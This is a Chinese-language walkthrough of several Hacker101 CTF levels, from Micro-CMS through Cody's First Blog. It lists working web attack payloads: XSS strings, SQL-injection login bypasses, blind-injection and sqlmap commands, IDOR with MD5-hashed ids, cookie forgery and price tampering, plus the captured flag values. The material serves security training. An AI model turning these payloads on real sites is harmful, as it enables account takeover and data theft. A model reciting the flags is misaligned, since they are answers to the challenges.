网址：
ctf.hacker101.com

关卡：
## 一、Micro-CMS v1
### （1）信息收集：
打开发现是个markdown管理系统。
可以创建markdown文件。可以发现这些文件前缀都是:
http://35.196.135.216:5001/795706216d/page/
通过最后的数字判断文件在哪个页面.可进行注入尝试。

而且发现网站中只能看到1,2
新创建的网页为6证明有东西被隐藏或者删除了。

发现还有几个动作,分别是：
page,edit,create

### （2）针对已知点进行攻击：
从弱到难：

先查看是否有隐藏信息:
输入3，4时都是400，而输入4时是403，代表4可能有问题:

http://35.196.135.216:5001/795706216d/page/4

试试其他动作看下，只有edit可试，尝试：
http://35.196.135.216:5001/795706216d/page/edit/4

真的发现了secret
My secret is 
```
^FLAG^a1fe3f4dbf0af943e60cccfd46d5a29bba3fea553f653f77a612a9b5606c2004$FLAG$
```

由于没有下一步提示，继续按照刚才的信息收集做：
尝试sql注入
对于page页面，
','%23,and 1均错误

再尝试edit页面，
加'里面出现flag:
http://35.196.135.216:5001/795706216d/page/edit/1'
证明这里不是有sql注入，而是出题人故意而为
^FLAG^e17cd93321a1c635890ed50fc48aa1e2334a10e01b5a8c9686448834a057ef7f$FLAG$

现在好像没思路了，再想想刚刚的信息收集，
edit,page,create
联想edit和create都有输入框，
尝试标题处edit xss:
<script>alert('1')</script>

^FLAG^ae1ef3b7de7e4d4e0b03e016783a7b1e3f8e7d6de33e481933a76476189cf189$FLAG$

发现create也同样的可以xss，

尝试内容处xss，
测试发现显示内容时<script>标签被过滤了。
此处怀疑点，接下来想办法绕xss。发现script标签被过滤了，

尝试用img
<img src="666" onclick="alert('1')"/>
查看源码发现flag:
flag="^FLAG^06a584e35f473b43e63cbe6da1fa8c2a84c4f938e3ca9b51251a52e5e5f218cf$FLAG$"

## 二、Micro-CMS v2

### （1）信息收集
动作:
edit,page,create,login

发现不登录可以使用page操作
登录后才能edit,create
而且根据cms内公告信息可以看出用户名为admin

登录出可能有问题
### (2)开始攻击

登录出尝试：
正常输入：admin 结果：Unknown user
输入 admin'  结果:报错，而且显示的是python编的代码
查询语句是：
'SELECT password FROM admins WHERE username=\'%s\'' % request.form['username'].replace('%', '%%')) == 0

所以查询语句是：
SELECT password FROM admins WHERE username='%s'


用
万能密码：admin' or 1=1 and '1'='1  结果：:Invalid password

直接猜密码（布尔盲注的方式），
admin' or (sql)(condition) '%s' and '1'='1 
用脚本
python 2_1.py -t admins -f password -w "1 limit 0,1"
破解出密码为magaret,
这时可以直接输入万能密码为账户，magaret为密码登录
还可以继续猜用户名
python 2_1.py -t admins -f username -w "1 limit 0,1"
账户名为norman

也可以用网上的sqlmap语句
sqlmap -u http://35.190.155.168:5001/c3c5d49d5d/login --method POST --data "username=admin&password=" -p username --dbs --dbms mysql --regexp "invalid password" --level 2

登录后得到第一个flag

^FLAG^990cf6fc09b8e936863cacf172a8dad20d59167fea8678868f556d2934e0cc48$FLAG$


现在尝试访问edit页面，可是发现登录了也无法访问，怎么回事呢？
抓包发现edit的时候会重定向到登录，但是重定向到登录有referer头也不起作用，还是出现flag1的界面
尝试edit的时候用其他方法，post方法
获取flag:
^FLAG^93f40103722bfad62cc30605157ce10827c2142fbda6d0e7fa40d406d38cdaf0$FLAG$


没有其他有用信息了，尝试爆整个库吧
python 2_1.py -t information_schema.tables -f table_name -w "table_schema=database()"
表名：
admins,pages
将整个库全部爆出也没有什么有用信息

再想想还有什么思路？

可以发现每次登录都是登录后出现flag，但是并不能编辑，那么难道就真的不能编辑吗？尝试不用数据库记录的登录而且绕过登录
账号:
' union select '1'#
密码：
1
发现成功登录了。而且没有显示主页面，返回home页面发现多一个private page，点击后出现flag:

^FLAG^e876c996811eef2faa820ba0b9eafb65fed0cb44e32fc5022d4d62ff47781cf6$FLAG$


## 三.关卡三 POSTBOOK

### （1） 信息收集
主页面提示：可以发公开文章和私有文章。
有一个注册页面和登录页面
注册进去后登录，

发现主页有两篇文章了，还有个发post按钮，可以设置文章为私有，还有my profile和settings两个按钮

其中一篇文章是user账户写的，还有一篇文章是注册时自动生成的。

点击文章进去发现url为
http://35.190.155.168:5001/693deb9543/index.php?page=view.php&id=1


### （2）开始攻击
1. 
最显著的攻击点应该是url里面的id和page
可能存在LFI或SQL注入

先尝试sql注入,用Burp模糊测试
发现sql注入没效果

测试LFI没效果

但是发现个奇怪的点，id=1是第一篇文章，id=3是第三篇文章。是不是是私有文章被隐藏了？

尝试id=2
出现flag：
^FLAG^ae5ebffc0f45f4e301a35f1c48a6e1ab0ab15d36b38d9d3a03679489edb6aaf4$FLAG$
题目意思看似隐藏的地方其实不安全（并没有真正隐藏）

猜测是否还有其他隐藏的文章？
burp爆破一下,发现id为946时又出现一个flag:
^FLAG^fade418d0bf44e5e7eb280009610a4cee822e35081fd64abff5527ad18538df0$FLAG$

2. 
尝试write post中xss注入
<script>alert('456')</script>
发现没用

尝试在private页面xss出现flag：
^FLAG^136fd360c8b07564f5108d69428d93a7c5e10f272df9606f687f24ff5f5e60b8$FLAG$
题目意思可以在别人的隐藏页面xss更有效果：



3.尝试登录处sql注入
sql注入无果

4.弱口令
猜测管理员是user，因为它发的文章是Hello Everyone!
尝试弱口令登录
用Burp的密码模糊测试.得出密码为password
登录出现flag
^FLAG^b805c0a8b38d6e93be541c8a92a24a94a73a27019d8d52e13f2993d4c4cc704b$FLAG$

5.因为有多个用户，可以尝试下是否有越权问题
越权查看已经知道了，
看下是否有越权删除和越权编辑

抓删除包:
```
GET /b52a640371/index.php?page=delete.php&id=e4da3b7fbbce2345d7772b0674a318d5 HTTP/1.1
Host: 35.190.155.168:5001
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://35.190.155.168:5001/b52a640371/index.php?page=home.php
Cookie: id=eccbc87e4b5ce2fe28308fd9f2a7baf3
Connection: close
Upgrade-Insecure-Requests: 1
```

发现传入的参数有id，而且id好像被加密了，32位，查了下是md5加密
改为id=（2的hash）试试？
发现id为2的被删除了
而且新flag出现了
^FLAG^7d1afa858c305ade10f35272c6ed4067853e94d15f3c9729edf92f4d08d1aa3d$FLAG$

同时也发现cookies中的id也是加密的,而且是当前用户的id（3,当前用户是我创建的第二个用户）
可以知道服务器是通过cookie来验证身份的，用别人id越权创建试下。
出现flag
^FLAG^f6614ed7527fe8333dbfb00a21480563db95a6650186aaa420e9243a16add752$FLAG$

最后一个flag，题目提示试着伪造id为1登陆 
出现flag:
^FLAG^6d30325139a20ceae69f30bc0a5e320131b5b9be58d1cf31174f7d55e8a1d84c$FLAG$




## 四.关卡四 Petshop Pro

checkout时抓包，发现body中带了价格，改为负的即可。^FLAG^83a2b55a90ee38d86981626ee176f13488dd9c8f83c54b03a57774c54d91746a$FLAG$ 


扫描一下网站
发现后台
http://35.190.155.168:5001/e67c97bb00/login


## 五.关卡五 Photo Gallery

### 1.信息收集
打开主页发现有个
url:/fetch?id=1

dirmap 信息枚举发现


### 2.开始攻击

#### 2.1.暴力
/fetch?id=1 枚举id测试


#### 2.2 sql注入
/fetch?id=1 and 1显示正确
/fetch?id=1 and 0 显示错误 存在sql注入

猜想查询语句:select image from image_info where id = {id}

尝试union注入发现不行，
尝试报错注入发现不行
布尔盲注
```
id=1 and (length(database()) > 1)  正确
id=1 and (length(database()) > 20) 错误
```
布尔盲注存在
用脚本盲注：
python3 5_2_2.py -t information_schema.tables -f table_name -w "table_schema=database()"
表名：
albums,photos

python3 5_2_2.py -t information_schema.columns -f column_name -w "table_name='albums'"
python3 5_2_2.py -t information_schema.columns -f column_name -w "table_name='photos'"

albums表id,title列
photos表id,title,filename,parent列

python3 5_2_2.py -t albums -f title

Kittens

python3 5_2_2.py -t photos -f title

Utterly adorable,Purrfect,Invisible

python3 5_2_2.py -t photos -f filename

files/adorable.jpg,files/purrfect.jpg,c2eb2521a9162bb8bbeabc90519f32539a832d09aa816f80e9608edca3d54b1e

得到flag:
^FLAG^c2eb2521a9162bb8bbeabc90519f32539a832d09aa816f80e9608edca3d54b1e$FLAG$
### 2.3



## 六.关卡六 Cody's First Blog

### 1.信息收集

打开后提示作者可以上传文件，而且是用include的方式。

而且还有个留言板怀疑存在xss

账户名是Cody

打开源码发现有
<!--<a href="?page=admin.auth.inc">Admin login</a>-->
出现后台链接

dirsearch扫描
扫描出dockerfile文件,php.ini,posts文件夹

dockerfile文件:

```
FROM nimmis/apache-php5

COPY 000-default.conf /etc/apache2/sites-available/000-default.conf
COPY php.ini /etc/php5/apache2/php.ini

EXPOSE 80

WORKDIR /app

RUN apt-get update
RUN DEBIAN_FRONTEND=noninteractive apt-get install -y mysql-client mysql-server libmysqlclient-dev build-essential python-dev python-pip
RUN pip install mysqlclient

ADD . /app

CMD bash setup.sh
```

### 2.开始攻击

访问：
/?page=admin.auth.inc
出现后台，而admin.auth.inc.php为后台地址
而且猜测可能还有LFI漏洞,存在任意文件遍历读取漏洞

